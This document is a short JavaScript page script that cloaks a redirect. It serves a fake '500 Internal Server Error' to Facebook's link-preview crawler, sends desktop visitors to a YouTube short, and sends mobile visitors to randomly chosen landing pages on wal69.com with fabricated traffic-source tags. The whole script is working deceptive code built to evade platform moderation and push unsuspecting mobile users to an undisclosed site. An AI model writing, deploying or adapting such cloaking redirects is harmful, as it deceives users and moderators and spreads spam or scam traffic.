   <script>
window.onload = function () {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    // Block Facebook crawler
    if (userAgent.includes("facebookexternalhit")) {
        document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
        return;
    }

    // Detect mobile devices
    const isMobile = navigator.userAgentData
        ? navigator.userAgentData.mobile
        : /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(userAgent);

    // Redirect PC/Desktop users
    if (!isMobile) {
        window.location.replace(
            "https://www.youtube.com/shorts/Hdidwf_4I8I"
        );
        return;
    }

    // Generate unique IDs for mobile redirect links
    const randomId1 = Math.floor(Math.random() * 90000) + 10000;
    const randomId2 = Math.floor(Math.random() * 90000) + 10000;
    const randomId3 = Math.floor(Math.random() * 90000) + 10000;

    // Generate a random 2-to-3 digit GitHub ID
    const randomGithubId = Math.floor(Math.random() * 990) + 10;

    const pages = [
        "https://wal69.com/landing.php/?utm_source=facebook&utm_campaign=post_id_" + randomId1,

        "https://wal69.com/landing.php/?utm_source=m.baidu.com/s?word=wal69.com&utm_campaign=post_id_" + randomId3,

        "https://wal69.com/landing.php/?utm_source=telegram&utm_campaign=post_id_github" + randomGithubId,

        "https://wal69.com/landing.php/?utm_source=facebook&utm_campaign=post_id_" + randomId2
    ];

    const randomPage = pages[Math.floor(Math.random() * pages.length)];

    window.location.replace(randomPage);
};
</script>
